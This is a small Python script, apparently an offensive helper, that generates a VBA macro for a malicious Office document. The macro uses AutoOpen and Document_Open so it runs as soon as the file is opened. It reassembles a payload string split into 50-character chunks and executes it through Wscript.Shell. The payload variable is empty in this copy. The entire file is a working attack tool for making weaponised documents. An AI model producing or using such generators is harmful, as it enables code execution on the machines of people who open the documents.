#!/usr/bin/env python3

str = ""


n = 50

macro_name = 'MyEdits'
end_sub ='End Sub'


macro = 'Sub AutoOpen()\n'
macro += f'  {macro_name}\n'
macro += f'{end_sub}\n'
macro += '\nSub Document_Open()\n'
macro += f'  {macro_name}\n'
macro += f'{end_sub}\n'
macro += f'\nSub {macro_name}()\n'
macro += '\n  Dim Str As String\n'

print(macro)

for i in range(0, len(str), n):
	print("  Str = Str + " + '"' + str[i:i+n] + '"')

print('\n  CreateObject("Wscript.Shell").Run Str')
print(f'\n{end_sub}')
